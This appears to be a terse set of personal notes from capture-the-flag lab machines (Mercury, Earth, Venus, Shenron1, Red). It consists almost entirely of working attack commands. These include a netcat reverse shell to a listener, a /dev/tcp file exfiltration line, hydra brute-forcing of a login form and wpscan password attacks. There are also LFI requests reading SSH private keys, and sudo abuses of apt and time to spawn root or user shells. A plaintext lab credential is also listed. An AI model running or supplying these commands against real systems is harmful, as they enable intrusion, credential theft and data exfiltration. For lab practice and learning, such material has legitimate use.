Mercury:
{}

:Invalid username."
Earth:
{
Spawn a bash shell old ver:
nc -e /bin/bash <listener> 3333
python -c "import pty; pty.spawn("bash")'

Find files with permission:
find / -perm -u=s -ls 2>/dev/null

Send a file: 
Sender: nc <ip> <port> < filename *or* cat /path/to/file > /dev/tcp/<listener>/3333
Reciever: nc -lnvp > filename
}

Venus:
{
hydra -L u.txt -p pass -s 8080 <ip> http-post-form"/:username=^USER^&password=^PASS^:Invalid username"
}


Shenron1:
{
Cred in cmt
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh

jenny:Mypa$$wordi$notharD@123
}


Red:
{
Hashcat rules(gen rule based wordlist):
hashcat --force pass.txt -r /usr/share/hashcat/rules/best66.rule --stdout > wordlist.txt

WORDPRESS scanning:
Enumerate usernames:
wpscan --url http://0.0.0.0/ -e u
wpscan --url http://0.0.0.0/ -e u,p

Password attack if username is known:
wpscan --url http://0.0.0.0/ --usernames admin --passwords /usr/share/wordlist.txt

wpscan -e u, p 	#p --> plugins, u --> usernames
wpscan --url <> --plugins-detection mixed


Backdoor scanning(needed tool: seclists ~500MB):
gobuster dir -u http://0.0.0.0/ -w /usr/share/seclists/Discovery/Web-Content/P-L-S/CommonBackdoor-PHP.fuzz.txt

Fuzzing (read /etc/passwd if exists):
wfuzz -u http://0.0.0.0/backdoor.php?FUZZ=/path/to/wherever

Reading the backdoor file:
curl http://0.0.0.0/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php
curl http://redrocks.win/NetworkFileManagerPHP.php?key=/home/user/.ssh/id_rsa
curl http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php
echo 'asfadfd' | base64 -d

had perm to run /usr/bin/time as ippsec with NOPASSWD
Switching user using that:
sudo -u ippsec /usr/bin/time /bin/sh
or
sudo -u ippsec time sh


}

tsts
